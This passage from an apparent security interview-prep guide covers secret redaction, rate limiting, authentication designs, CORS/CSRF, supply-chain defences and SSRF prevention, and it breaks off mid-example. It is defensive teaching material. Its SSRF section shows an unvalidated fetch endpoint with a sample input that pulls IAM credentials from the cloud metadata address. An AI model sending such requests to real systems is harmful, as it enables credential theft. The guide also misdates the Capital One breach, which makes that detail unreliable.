        (r'Authorization: [^\n]+', 'Authorization: ***'),
        (r'"token":\s*"[^"]+"', '"token": "***"'),
        (r'"password":\s*"[^"]+"', '"password": "***"'),
        (r'"api_key":\s*"[^"]+"', '"api_key": "***"'),
        (r'PRIVATE KEY-----[^\n]*\n', 'PRIVATE KEY-----\n***\n-----END'),
    ]

    def format(self, record):
        msg = super().format(record)
        for pattern, replacement in self.SECRET_PATTERNS:
            msg = re.sub(pattern, replacement, msg, flags=re.IGNORECASE)
        return msg
```

**The Secrets Lifecycle:**

```
1. Create:   Vault generates credential (dynamic) or operator stores encrypted secret
2. Distribute: App retrieves via Vault API at startup (never file/env var)
3. Use:      Credential in memory only, never written to disk
4. Renew:    Before TTL expiry, app requests new credential (seamless rotation)
5. Revoke:   Vault revokes lease, credential auto-expires
6. Audit:    Every access logged — who got what, when, from which IP
```

### 🔍 Staff-Level Evaluation

| Criterion | What I'm Looking For |
|-----------|----------------------|
| **Dynamic vs static** | Clearly explains dynamic secrets with auto-expiry |
| **Vault integration** | Shows concrete API usage (hvac client, lease management) |
| **Leak prevention** | Mentions log redaction, never-in-env-vars, git history scanning |
| **Rotation strategy** | Describes zero-downtime credential rotation (warm pools, dual credentials) |

---

## 6. Rate Limiting & DDoS Protection

**Q:** "Design a multi-layered rate limiting and DDoS protection system for a public API serving 100K requests/second. The system must distinguish between a legitimate flash crowd and a coordinated botnet attack. Cover application-level, infrastructure-level, and edge protection."

**What They're Really Testing:** Whether you understand rate limiting as a distributed systems problem and can layer defenses at different levels of the stack.

### Answer

**Layer 1: Edge / CDN Protection**

```yaml
# Cloudflare / AWS Shield / Fastly:
#   - DDoS mitigation at the network edge (before traffic reaches your servers)
#   - SYN flood: SYN cookies (stateless TCP handshake verification)
#   - UDP flood: rate limit per source IP, drop non-essential protocols
#   - DNS amplification: disable open DNS recursion, rate limit per source

# AWS Shield Advanced:
#   - Automatic DDoS cost protection
#   - WAF integration for layer 7 filtering
#   - Real-time DDoS metrics via CloudWatch

# Cloudflare Magic Transit:
#   - Anycast network absorbs DDoS traffic
#   - Rate limiting at edge: 10M+ requests per second
#   - Bot management: JS challenge, CAPTCHA for suspicious traffic
```

**Layer 2: Application-Level Rate Limiting**

```python
# Token Bucket Algorithm — the most common approach
import time
import threading
from collections import defaultdict

class TokenBucket:
    """
    Token Bucket: Each user has a bucket with N tokens.
    Tokens refill at a fixed rate (R tokens/second).
    Each request consumes 1 token. If bucket is empty, request is denied.
    
    Advantages: Allows burst traffic (up to bucket size), smooths out sustained traffic
    """
    def __init__(self, capacity: int, refill_rate: float):
        self.capacity = capacity         # Max tokens in bucket
        self.refill_rate = refill_rate    # Tokens per second
        self.tokens = capacity           # Start full
        self.last_refill = time.monotonic()
        self.lock = threading.Lock()

    def consume(self) -> bool:
        with self.lock:
            now = time.monotonic()
            elapsed = now - self.last_refill
            # Refill tokens based on elapsed time
            self.tokens = min(self.capacity,
                              self.tokens + elapsed * self.refill_rate)
            self.last_refill = now

            if self.tokens >= 1:
                self.tokens -= 1
                return True  # Request allowed
            return False  # Rate limited


# Distributed Rate Limiter (Redis-based, sliding window)
import redis

class SlidingWindowRateLimiter:
    """
    Sliding Window Log: Maintains a sorted set of timestamps per user.
    Count requests in the last window (e.g., 60 seconds).
    More accurate than fixed window (no thundering herd at window boundary).
    """
    def __init__(self, redis_client: redis.Redis):
        self.redis = redis_client

    def is_allowed(self, key: str, max_requests: int, window_seconds: int = 60) -> bool:
        now = time.time()
        window_start = now - window_seconds
        redis_key = f"ratelimit:{key}"

        pipe = self.redis.pipeline()
        # Remove old entries outside the window
        pipe.zremrangebyscore(redis_key, 0, window_start)
        # Count remaining entries
        pipe.zcard(redis_key)
        # Add current request
        pipe.zadd(redis_key, {str(now): now})
        # Set expiry to auto-clean
        pipe.expire(redis_key, window_seconds + 60)
        results = pipe.execute()

        request_count = results[1]  # zcard result

        return request_count <= max_requests

    # Usage:
    # Rate limit: 100 requests per minute per user
    # if limiter.is_allowed(f"user:{user_id}", 100, 60):
    #     process_request()
    # else:
    #     return 429 Too Many Requests
```

**Multi-Tier Rate Limiting Strategy:**

```python
class RateLimitMiddleware:
    """Multi-tier rate limiting:
    Tier 1: Global (protects the whole system)
    Tier 2: Per-endpoint (protects expensive operations)
    Tier 3: Per-user/IP (fairness)
    Tier 4: Per-user-per-endpoint (granular control)
    """

    TIERS = {
        'global':     {'limit': 100000, 'window': 1,     'key': 'global'},       # 100K req/s
        'per_ip':     {'limit': 100,    'window': 60,    'key': 'ip:{ip}'},       # 100 req/min per IP
        'per_user':   {'limit': 1000,   'window': 60,    'key': 'user:{user}'},   # 1K req/min per user
        'write':      {'limit': 10,     'window': 60,    'key': 'write:{user}'},  # 10 writes/min
        'search':     {'limit': 30,     'window': 60,    'key': 'search:{ip}'},   # 30 searches/min
    }

    def check_all(self, request):
        for tier_name, config in self.TIERS.items():
            key = config['key'].format(
                ip=request.client.host,
                user=request.user.id if request.user else 'anonymous'
            )
            if not self.limiter.is_allowed(key, config['limit'], config['window']):
                raise RateLimitExceeded(
                    tier=tier_name,
                    retry_after=config['window']
                )
```

**Flash Crowd vs Botnet Detection:**

```python
# Heuristics to distinguish humans from bots:

def classify_traffic_pattern(requests: list) -> str:
    """
    Returns 'human', 'scraper', 'botnet', or 'flash_crowd'
    """
    # Botnet signatures:
    #   1. Same User-Agent across many IPs
    #   2. No JavaScript execution (no JS challenge solving)
    #   3. Perfectly regular intervals between requests
    #   4. Requests come from data center IP ranges
    #   5. No prior browsing history (no cookies)

    # Flash crowd signature:
    #   1. Requests from diverse geographic regions
    #   2. Real browser User-Agents
    #   3. Natural timing distribution (not perfectly regular)
    #   4. Existing cookies/sessions from prior activity
    #   5. Referrers from legitimate sources (social media, news)

    # Human signature:
    #   1. Mouse movements, scroll events
    #   2. Variable time between requests (reading time)
    #   3. Cookies from prior sessions
    #   4. CAPTCHA solvable

    if is_uniform_timing(requests) and all_same_ua(requests):
        return 'botnet'
    elif has_diverse_ips(requests) and has_real_browsers(requests):
        return 'flash_crowd'
    elif has_mouse_events(requests):
        return 'human'
    else:
        return 'suspected_scraper'
```

**Response to Rate Limit Exceeded:**

```http
HTTP/1.1 429 Too Many Requests
Retry-After: 45
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1700000045

{
  "error": "rate_limit_exceeded",
  "message": "Too many requests. Please try again in 45 seconds.",
  "retry_after_seconds": 45
}
```

### 🔍 Staff-Level Evaluation

| Criterion | What I'm Looking For |
|-----------|----------------------|
| **Multi-layer approach** | Describes edge, infrastructure, and application layers |
| **Algorithm choice** | Explains token bucket vs sliding window vs leaky bucket tradeoffs |
| **Distributed implementation** | Uses Redis, handles atomicity (lua scripts, redis pipelines) |
| **False positive prevention** | Distinguishes flash crowds from attacks, uses CAPTCHA/JS challenges |

---

## 7. Authentication: Session vs Token vs Passwordless

**Q:** "You're designing authentication for a new fintech application handling high-value transactions. Compare and contrast session-based, token-based (JWT), and passwordless (WebAuthn/passkeys) authentication. Which would you choose and why?"

**What They're Really Testing:** Understanding of the fundamental tradeoffs between stateful vs stateless auth, and knowledge of the emerging passwordless standard (WebAuthn).

### Answer

**Session-Based Authentication:**

```python
# Server-side state: session ID stored in cookie, session data in Redis/DB

@router.post("/login")
async def login(username: str, password: str, session: Session):
    user = authenticate(username, password)
    if not user:
        raise HTTPException(401)

    # Server creates session, stores in Redis
    session_id = secrets.token_urlsafe(32)
    await redis.setex(
        f"session:{session_id}",
        3600,  # 1 hour
        json.dumps({"user_id": user.id, "role": user.role, "mfa": True})
    )

    # Set httpOnly, Secure, SameSite cookie
    response.set_cookie(
        key="session_id",
        value=session_id,
        httponly=True,     # Not accessible via JavaScript
        secure=True,        # HTTPS only
        samesite="lax",    # CSRF protection
        max_age=3600
    )


@router.get("/api/balance")
async def get_balance(session_id: str = Cookie(None)):
    # Every request: server looks up session in Redis
    session_data = await redis.get(f"session:{session_id}")
    if not session_data:
        raise HTTPException(401, "Session expired")

    user = json.loads(session_data)
    return get_account_balance(user["user_id"])

# Revocation: DELETE the Redis key. Instant. Done.
# async def logout(session_id):
#     await redis.delete(f"session:{session_id}")
```

**Token-Based Authentication (JWT):**

```python
# Stateless: token contains all user info + signature
# No server-side storage needed for verification

ACCESS_TOKEN_TTL = 15 * 60      # 15 minutes
REFRESH_TOKEN_TTL = 7 * 24 * 3600  # 7 days

@router.post("/login")
async def login(username: str, password: str):
    user = authenticate(username, password)

    # Access token: short-lived, stateless
    access_token = jwt.encode({
        "sub": user.id,
        "role": user.role,
        "ver": user.token_version,  # For revocation
        "iat": datetime.utcnow(),
        "exp": datetime.utcnow() + timedelta(seconds=ACCESS_TOKEN_TTL),
    }, SECRET_KEY, algorithm="HS256")

    # Refresh token: longer-lived, stored in DB
    refresh_token = secrets.token_urlsafe(64)
    await db.execute(
        "INSERT INTO refresh_tokens (token, user_id, expires_at) VALUES (?, ?, ?)",
        [hash_token(refresh_token), user.id, datetime.utcnow() + timedelta(days=7)]
    )

    return {"access_token": access_token, "refresh_token": refresh_token, "expires_in": ACCESS_TOKEN_TTL}


@router.post("/refresh")
async def refresh(refresh_token: str):
    # Verify refresh token in DB
    stored = await db.fetch_one(
        "SELECT user_id FROM refresh_tokens WHERE token_hash = ? AND expires_at > NOW()",
        [hash_token(refresh_token)]
    )
    if not stored:
        raise HTTPException(401, "Invalid or expired refresh token")

    # Issue new access token
    user = await get_user(stored["user_id"])
    new_access = jwt.encode({
        "sub": user.id,
        "role": user.role,
        "ver": user.token_version,
        "exp": datetime.utcnow() + timedelta(seconds=ACCESS_TOKEN_TTL),
    }, SECRET_KEY, algorithm="HS256")

    return {"access_token": new_access, "expires_in": ACCESS_TOKEN_TTL}
```

**Passwordless Authentication (WebAuthn / FIDO2 / Passkeys):**

```python
# WebAuthn uses public key cryptography — no passwords to leak!
# User registers a device (or passkey), which generates a key pair:
#   - Private key: stays on the user's device (phone, YubiKey, TPM)
#   - Public key: sent to the server

# Registration (one-time):

@router.post("/webauthn/register/begin")
async def webauthn_register_begin(user: User):
    # Server generates a challenge and sends it to the browser
    options = generate_registration_options(
        rp_id="fintech-app.com",          # Relying Party ID
        rp_name="Fintech App",
        user_id=str(user.id),
        user_name=user.email,
        # Require user verification (biometric or PIN) for fintech
        authenticator_selection={
            "user_verification": "required",    # Fingerprint/PIN required!
            "resident_key": "required",         # Creates a passkey
        },
        # Timeout: 5 minutes
        timeout=300000,
    )
    # Store challenge temporarily for verification
    await redis.setex(f"webauthn:challenge:{user.id}", 300, options.challenge)
    return options


@router.post("/webauthn/register/complete")
async def webauthn_register_complete(user: User, credential: dict):
    # Browser sends back the credential (public key + signed challenge)
    expected_challenge = await redis.get(f"webauthn:challenge:{user.id}")

    registration = verify_registration_response(
        credential=credential,
        expected_challenge=expected_challenge,
        expected_origin="https://fintech-app.com",
        expected_rp_id="fintech-app.com",
    )

    # Store the public key for future authentication
    await db.execute("""
        INSERT INTO webauthn_credentials
        (user_id, credential_id, public_key, sign_count, device_name)
        VALUES (?, ?, ?, ?, ?)
    """, [
        user.id,
        registration.credential_id,
        registration.credential_public_key,
        registration.sign_count,
        credential.get("device_name", "Unknown Device")
    ])

    return {"status": "registered", "credential_id": registration.credential_id}


# Authentication (passwordless login):

@router.post("/webauthn/login/begin")
async def webauthn_login_begin(email: str):
    user = await get_user_by_email(email)
    credentials = await db.fetch_all(
        "SELECT credential_id FROM webauthn_credentials WHERE user_id = ?",
        [user.id]
    )

    options = generate_authentication_options(
        rp_id="fintech-app.com",
        allow_credentials=[
            {"id": c["credential_id"], "type": "public-key"}
            for c in credentials
        ],
        user_verification="required",  # Biometric check!
    )
    await redis.setex(f"webauthn:challenge:{user.id}", 300, options.challenge)
    return options


@router.post("/webauthn/login/complete")
async def webauthn_login_complete(email: str, credential: dict):
    user = await get_user_by_email(email)
    expected_challenge = await redis.get(f"webauthn:challenge:{user.id}")

    # Find the stored public key for this credential
    stored_cred = await db.fetch_one(
        "SELECT * FROM webauthn_credentials WHERE credential_id = ? AND user_id = ?",
        [credential["id"], user.id]
    )

    authentication = verify_authentication_response(
        credential=credential,
        expected_challenge=expected_challenge,
        expected_origin="https://fintech-app.com",
        expected_rp_id="fintech-app.com",
        credential_public_key=stored_cred["public_key"],
        credential_current_sign_count=stored_cred["sign_count"],
    )

    # Update sign count to detect cloned authenticators
    if authentication.new_sign_count <= stored_cred["sign_count"]:
        # Possible cloned authenticator! Alert security team
        raise HTTPException(401, "Authenticator may be cloned")
    await db.execute(
        "UPDATE webauthn_credentials SET sign_count = ? WHERE credential_id = ?",
        [authentication.new_sign_count, credential["id"]]
    )

    # Issue session (WebAuthn verified the user)
    return create_session(user)
```

**Comparison Table:**

| Aspect | Sessions | JWT Tokens | WebAuthn/Passkeys |
|--------|----------|------------|-------------------|
| **State** | Server-side (Redis/DB) | Client-side (stateless) | Client-side (private key) |
| **Revocation** | Instant (delete session) | Requires version/blocklist | Instant (delete public key) |
| **Phishing resistance** | Medium (cookie theft possible) | Low (token theft = full access) | High (bound to origin) |
| **Scalability** | Requires shared session store | Trivially scalable | Minimal server state |
| **User experience** | Login + optional MFA | Login + optional MFA | Biometric/fingerprint |
| **Password leak risk** | Password stored (hashed) | Password stored (hashed) | No passwords at all! |
| **Device support** | All browsers | All browsers | Modern browsers + devices |
| **MFA integration** | Manual (app-level) | Manual (app-level) | Built-in (biometric required) |

**Recommendation for Fintech:**

```yaml
# Hybrid approach (what I'd actually build):

Primary: WebAuthn/Passkeys
  - No passwords to leak
  - Phishing-resistant (bound to origin)
  - Built-in biometric MFA
  - Great UX (biometric = frictionless)

Fallback: Short-lived sessions (with TOTP MFA)
  - For devices that don't support WebAuthn
  - Session-based (easy revocation for fraud)
  - Rotate session ID on privilege escalation

Never: Long-lived JWTs alone
  - Fintech can't tolerate 15-minute revocation window
  - Token theft = instant fraud
  - No built-in MFA
```

### 🔍 Staff-Level Evaluation

| Criterion | What I'm Looking For |
|-----------|----------------------|
| **Tradeoff analysis** | Clearly articulates stateful vs stateless revocation tradeoffs |
| **WebAuthn depth** | Understands challenge-response, origin binding, sign count anti-cloning |
| **Practical recommendation** | Proposes a hybrid based on threat model (not a one-size-fits-all) |
| **MFA integration** | Distinguishes app-level MFA vs WebAuthn's built-in biometric verification |

---

## 8. CORS, CSRF, and SameSite Cookies

**Q:** "After migrating your frontend from 'app.example.com' to 'app.newdomain.com', users report they can't log in — their session cookie isn't being sent. Walk through the diagnosis and fix, covering CORS, CSRF, and SameSite cookies."

**What They're Really Testing:** Whether you understand the browser security model (same-origin policy) and can debug real-world cross-origin authentication issues.

### Answer

**Diagnosis — The Cookie Isn't Being Sent:**

```yaml
# Problem:
#   Frontend: https://app.newdomain.com
#   Backend:  https://api.example.com
#   
#   Browser blocks cookie from being sent because:
#     1. Different origin (newdomain.com ≠ example.com)
#     2. Cookie's Domain attribute doesn't match
#     3. SameSite defaults to Lax — may not be sent on cross-origin POST
#     4. CORS preflight may fail without proper Access-Control-* headers
```

**Step 1: Fix CORS Configuration**

```python
# CORS = Cross-Origin Resource Sharing
# Server must explicitly whitelist the frontend origin

from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    # NEVER use "*" for credentialed requests!
    allow_origins=[
        "https://app.newdomain.com",
        # For local development:
        "http://localhost:3000",
        "http://localhost:5173",
    ],
    # Critical for cookies:
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["Content-Type", "Authorization", "X-CSRF-Token"],
)

# The browser sends a preflight OPTIONS request before the actual request
# If the server doesn't respond with proper Access-Control-Allow-Origin,
# the browser BLOCKS the request entirely
```

**Step 2: Fix Cookie Configuration**

```python
# The cookie set by the backend must be accessible from the new frontend

response.set_cookie(
    key="session_id",
    value=session_id,
    httponly=True,
    secure=True,             # Required for cross-origin (HTTPS only)
    samesite="none",         # REQUIRED for cross-origin requests!
    # Caveat: SameSite=None requires Secure=True
    # Without SameSite=None, browser won't send cookie cross-origin
    domain=".example.com",   # Must match the backend domain
    # Note: Can't set Domain to "newdomain.com" — cookies are domain-specific!
    max_age=3600,
)
```

**The SameSite Cookie Attribute — Deep Dive:**

```yaml
# SameSite is the MODERN defense against CSRF (replaces CSRF tokens in many cases)

SameSite=Strict:
  - Cookie sent ONLY for same-site requests
  - Not sent for: links from other sites, forms from other sites
  - Not sent for: images/iframes from other sites
  - Best for: banking sessions, account settings
  - Downside: User clicks a link from email → not authenticated

SameSite=Lax:
  - Cookie sent for top-level navigations (GET requests)
  - Not sent for: POST forms from other sites, images, fetch/XHR
  - Browser DEFAULT (since 2020)
  - Best for: most web apps (balance of security and UX)

SameSite=None:
  - Cookie sent for ALL cross-origin requests
  - REQUIRES Secure=True (HTTPS only)
  - Required for: API-only backends, separate frontend + backend domains
  - Vulnerable to CSRF if no other protection
```

**Step 3: Add CSRF Protection (Because SameSite=None is vulnerable):**

```python
# CSRF = Cross-Site Request Forgery
# Attacker tricks user into performing actions on another site
# 
# Attack:
#   1. User is logged in at bank.com (session cookie set with SameSite=None)
#   2. User visits attacker.com
#   3. attacker.com sends POST to bank.com/transfer
#   4. Browser includes the session cookie (because SameSite=None)
#   5. Bank processes the transfer — ATTACKED!

# Defense: CSRF Token (Double-Submit Cookie Pattern)

import secrets
from fastapi import Request, HTTPException

class CSRFTokenMiddleware:
    """
    Double-Submit Cookie Pattern:
      1. Server sets a random CSRF token in a cookie (not httpOnly)
      2. Frontend reads the cookie and sends it as a header (X-CSRF-Token)
      3. Server verifies: cookie value == header value
      4. Attacker can't read the cookie from a different origin (SOP)
    """

    async def get_csrf_token(self, request: Request, response: Response):
        # Generate token if not present
        token = request.cookies.get("csrf_token")
        if not token:
            token = secrets.token_urlsafe(32)
            response.set_cookie(
                key="csrf_token",
                value=token,
                httponly=False,   # Must be readable by JavaScript!
                secure=True,
                samesite="strict",
                # Path=/ ensures the cookie is sent to all endpoints
                path="/",
            )
        return token

    async def verify_csrf(self, request: Request):
        # Skip for safe methods
        if request.method in ("GET", "HEAD", "OPTIONS"):
            return True

        cookie_token = request.cookies.get("csrf_token")
        header_token = request.headers.get("X-CSRF-Token")

        if not cookie_token or not header_token:
            raise HTTPException(403, "Missing CSRF token")

        if not secrets.compare_digest(cookie_token, header_token):
            raise HTTPException(403, "CSRF token mismatch")

        return True
```

**Frontend Implementation:**

```javascript
// Frontend must include the CSRF token in all mutation requests

async function apiPost(url, data) {
  // Read the CSRF token from the cookie
  const csrfToken = getCookie('csrf_token');

  const response = await fetch(url, {
    method: 'POST',
    credentials: 'include',     // Send cookies cross-origin
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,  // Double-submit
    },
    body: JSON.stringify(data),
  });

  return response.json();
}

function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}
```

**Full CORS Preflight Example:**

```
# Browser sends PREFLIGHT (OPTIONS) before the actual POST:

OPTIONS /api/transfer HTTP/1.1
Origin: https://app.newdomain.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, X-CSRF-Token

# Server responds:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.newdomain.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Content-Type, X-CSRF-Token
Access-Control-Max-Age: 86400  # Cache preflight for 24 hours
```

### 🔍 Staff-Level Evaluation

| Criterion | What I'm Looking For |
|-----------|----------------------|
| **SameSite understanding** | Knows the three modes and their security implications |
| **CORS configuration** | Explains credentialed requests require explicit origin + allow-credentials |
| **CSRF token mechanism** | Describes the double-submit cookie pattern |
| **Defense in depth** | Combines SameSite + CSRF tokens + CORS rather than relying on one |

---

## 9. Supply Chain Security

**Q:** "Your company was alerted that a popular npm package you depend on was compromised — the attacker injected malicious code that exfiltrates environment variables. Design a supply chain security strategy that would detect and prevent this at multiple stages: development, CI/CD, and deployment."

**What They're Really Testing:** Whether you understand modern software supply chain attacks (SolarWinds, event-stream, codecov) and have a practical defense-in-depth strategy.

### Answer

**The Threat Model:**

```yaml
Attack vectors in the software supply chain:

1. Compromised upstream dependency (event-stream, ua-parser-js)
   - Attacker gains maintainer access, publishes malicious version

2. Dependency confusion (npm, pip)
   - Attacker publishes package with same name as internal package in public repo
   - Package manager installs the public (malicious) one if priority is misconfigured

3. Typosquatting (crossenv vs cross-env, tor-request vs got)
   - Attacker registers a similar-looking package name

4. Build infrastructure compromise (Codecov, SolarWinds)
   - Attacker compromises CI/CD pipeline, injects malicious artifacts

5. Compromised developer machine
   - Attacker steals signing keys, publishes as legitimate maintainer
```

**Stage 1: Development — Dependency Management:**

```yaml
# Package-lock.json / yarn.lock / requirements.txt:
#   Lock files PIN exact versions and verify integrity hashes
#   Without lock files: floating versions = ticking time bomb

# Example: package-lock.json entry
"axios": {
  "version": "1.6.2",
  "resolved": "https://registry.npmjs.org/axios/-/axios-1.6.2.tgz",
  "integrity": "sha512-7f+0Sa+...",  # SHA-512 checksum
}

# Best practices:
#   1. Commit lock files (always!)
#   2. Use npm ci instead of npm install in CI/CD (uses lock file exactly)
#   3. Enable npm audit / pip audit in pre-commit hooks
#   4. Use Snyk / Dependabot / Renovate for automated dependency scanning
```

**Dependency Scanning Configuration:**

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    # Auto-create PRs, assign reviewers
    # Include security score for each update
    open-pull-requests-limit: 10
    labels:
      - "dependencies"
      - "security"

  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "daily"

  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
```

**Stage 2: CI/CD — Artifact Verification:**

```python
# Before building, verify ALL dependencies against known vulnerabilities
# Fail the build if any vulnerability exceeds threshold

# Trivy — vulnerability scanner for containers and dependencies
# trivy fs --severity CRITICAL,HIGH ./my-project

# Grype — dependency-focused scanner
# grype package-lock.json

# In CI/CD pipeline:
stages:
  - security-scan
  - build
  - sign
  - push

security-scan:
  script:
    - npm audit --audit-level=high
    - trivy fs --severity CRITICAL,HIGH --exit-code 1 .
    - grype . --fail-on critical
  only:
    - main
    - tags

sign:
  # Sign the container image with cosign
  script:
    - cosign sign --key cosign.key ghcr.io/myapp:${CI_COMMIT_TAG}
    # Signature is stored in the container registry
    # Verification: cosign verify --key cosign.pub ghcr.io/myapp:tag
```

**Stage 3: Deployment — Runtime Verification:**

```yaml
# Kubernetes admission control:
#   Only allow verified images!

# Kyverno policy:
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image
spec:
  validationFailureAction: Enforce
  rules:
    - name: verify-cosign-signature
      match:
        resources:
          kinds:
            - Pod
      verifyImages:
        - image: "ghcr.io/myapp/*"
          key: |
            -----BEGIN PUBLIC KEY-----
            ...
            -----END PUBLIC KEY-----
          # Only deploy images with valid cosign signatures

# Also: ImagePolicyWebhook — verify image age, scan results
```

**Software Bill of Materials (SBOM):**

```yaml
# SBOM = A complete inventory of all components in your software
# Standard format: SPDX or CycloneDX

# Generate SBOM with syft:
#   syft ghcr.io/myapp:latest -o spdx-json > sbom.json

# Store SBOMs in a registry for audit and vulnerability correlation

# What the SBOM contains:
{
  "spdxVersion": "SPDX-2.3",
  "name": "myapp-1.2.3",
  "packages": [
    {
      "name": "axios",
      "versionInfo": "1.6.2",
      "licenseDeclared": "MIT",
      "externalRefs": [
        {
          "referenceCategory": "SECURITY",
          "referenceType": "cpe23Type",
          "referenceLocator": "cpe:2.3:a:axios_project:axios:1.6.2:*:*:*:*:*:*:*"
        }
      ]
    },
    # ... every single dependency
  ]
}

# When a new CVE is announced, you can:
#   grep -f cve-cpes sbom.json → find ALL affected deployments
#   This is the key benefit of SBOMs!
```

**Dependency Confusion Prevention:**

```python
# The Attack:
#   1. You use an internal package "auth-service" (published only to GitHub Packages)
#   2. Attacker publishes "auth-service" to npm public registry
#   3. If npm registry has higher priority, npm installs the malicious one
#   4. Malicious "auth-service" sends your secrets to attacker

# Prevention:

# npm: .npmrc
@mycompany:registry=https://npm.pkg.github.com/
# This scopes all @mycompany/* packages to GitHub Packages only

# pip: pip.conf
[install]
extra-index-url = https://my-private-pypi.com/simple
# ⚠️ extra-index-url creates dependency confusion risk!
# Better: use --index-url with a single registry

# pip: requirements.txt with hashes
# --require-hashes ensures EXACT package hashes, prevents substitution
my-internal-lib==1.0.0 --hash=sha256:abc123...

# Gradle/Maven: repository priority
repositories {
    maven {
        url "https://internal-artifactory.com/releases"
        // Higher priority than Maven Central
    }
    mavenCentral()
}
```

**Signed Commits & Artifacts:**

```yaml
# Every commit should be signed with GPG or SSH:
#   git commit -S -m "feat: add payment processing"
#   git log --show-signature

# Every container image should be signed with cosign:
#   cosign sign --key cosign.key ghcr.io/myapp:latest
#   cosign verify --key cosign.pub ghcr.io/myapp:latest

# Sigstore — free, automated signing:
#   cosign sign --fulcio-url=https://fulcio.sigstore.dev ghcr.io/myapp:latest
#   Uses ephemeral keys + identity (OIDC)
#   No key management needed!
```

### 🔍 Staff-Level Evaluation

| Criterion | What I'm Looking For |
|-----------|----------------------|
| **Multi-stage defense** | Covers dev, CI/CD, and runtime — not just one layer |
| **SBOM knowledge** | Knows what SBOMs are, how to generate them (syft), and how to use them |
| **Dependency confusion** | Understands the attack and how to prevent it (scoped packages, hashes) |
| **Artifact signing** | Mentions cosign/sigstore for container image verification |

---

## 10. SSRF & Server-Side Vulnerabilities

**Q:** "Your application has an SSRF vulnerability. The attacker used it to access the AWS metadata endpoint (169.254.169.254) and retrieved IAM credentials. Design a comprehensive SSRF prevention strategy covering application code, network architecture, and cloud configuration."

**What They're Really Testing:** Whether you understand Server-Side Request Forgery (SSRF) — one of the most dangerous and commonly missed vulnerabilities in modern web applications.

### Answer

**The Attack Walkthrough:**

```python
# The vulnerable endpoint:

@router.get("/fetch-url")
async def fetch_url(url: str):
    # User provides a URL, server fetches it
    # User input: "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"
    # 
    # What happens:
    #   1. Server makes HTTP request to 169.254.169.254
    #   2. This is the AWS metadata endpoint (link-local address)
    #   3. AWS EC2 returns the IAM role's temporary credentials
    #   4. Attacker now has ACCESS_KEY, SECRET_KEY, TOKEN
    #   5. Attacker uses these to access ANY AWS resource the role has access to

    response = requests.get(url)  # DANGER: No URL validation!
    return response.text
```

**The Scope of Damage:**

```yaml
# What the attacker can do with metadata credentials:
#   - Read S3 buckets (data exfiltration)
#   - Create EC2 instances (crypto mining)
#   - Access RDS databases
#   - Modify security groups
#   - Create IAM users
#   - Delete resources (ransomware)

# The 2021 Capital One breach: SSRF → metadata → 100M customer records
# The 2019 Tesla breach: SSRF → metadata → EC2 instance access
# This is a CRITICAL vulnerability (CVSS 9.1+)
```

**Defense Layer 1: Application-Level URL Validation**

```python
from urllib.parse import urlparse
import ipaddress
import socket

class SSRFProtector:
    """
    Multi-layer URL validation for SSRF prevention
    """

    # Allowlist of approved external services
    ALLOWED_HOSTS = {
        "api.stripe.com",
        "api.github.com",
        "maps.googleapis.com",
    }

    # Explicitly blocked private/reserved IP ranges
    BLOCKED_IP_RANGES = [
        ipaddress.ip_network("127.0.0.0/8"),       # Loopback
        ipaddress.ip_network("10.0.0.0/8"),        # Private (VPC)
        ipaddress.ip_network("172.16.0.0/12"),     # Private
        ipaddress.ip_network("192.168.0.0/16"),    # Private
        ipaddress.ip_network("169.254.169.254/32"),# AWS/GCP/Azure metadata!
        ipaddress.ip_network("169.254.170.2/32"),  # AWS ECS metadata
        ipaddress.ip_network("100.100.100.204/32"),# Alibaba metadata
        ipaddress.ip_network("fd00::/8"),          # Unique local address (IPv6)
        ipaddress.ip_network("fe80::/10"),         # Link-local (IPv6)
        ipaddress.ip_network("0.0.0.0/8"),         # Invalid
        ipaddress.ip_network("::1/128"),            # IPv6 loopback
    ]

    def validate_url(self, url: str) -> bool:
        """
        Returns True if URL is safe to fetch, raises SSRFException otherwise
        """
        parsed = urlparse(url)

        # Reject URLs without hostname
        if not parsed.hostname:
            raise SSRFException("No hostname in URL")

        # Block unexpected schemes
        if parsed.scheme not in ("https",):
            # Only HTTPS allowed — block HTTP, file, ftp, gopher, dict
            raise SSRFException(f"Scheme not allowed: {parsed.scheme}")

        # Check allowlist first
        if parsed.hostname in self.ALLOWED_HOSTS:
            return True

        # Resolve hostname to IP (BEFORE making the request!)
        try:
            ip = socket.gethostbyname(parsed.hostname)
        except socket.gaierror:
            raise SSRFException(f"Could not resolve hostname: {parsed.hostname}")

        # Check if resolved IP is in blocked ranges
        ip_addr = ipaddress.ip_address(ip)
        for blocked in self.BLOCKED_IP_RANGES:
            if ip_addr in blocked:
                raise SSRFException(f"Blocked IP range: {blocked}")

        # Additional: Block redirects that lead to private IPs
        # (implemented in the HTTP client below)
        return True

    def fetch_safely(self, url: str) -> requests.Response:
        self.validate_url(url)

        # Use a session with redirect validation
        session = requests.Session()

        def redirect_hook(response, *args, **kwargs):
            # Check redirect target before following
            if response.is_redirect:
                redirect_url = response.headers["Location"]
                self.validate_url(redirect_url)

        # Set strict timeouts (no hanging connections)
        response = session.get(
            url,
            timeout=(3, 5),        # (connect timeout, read timeout)
            allow_redirects=True,
            hooks={'response': redirect_hook},
            # Don't send credentials to arbitrary URLs
            # Don't include auth headers
        )
        return response


class SSRFException(Exception):
    pass
```

**Defense Layer 2: DNS Rebinding Protection**

```python
# DNS Rebinding Attack:
#   1. Attacker controls example.com, which initially resolves to PUBLIC IP
#   2. Application validates the URL → passes (public IP)
#   3. Application makes the request
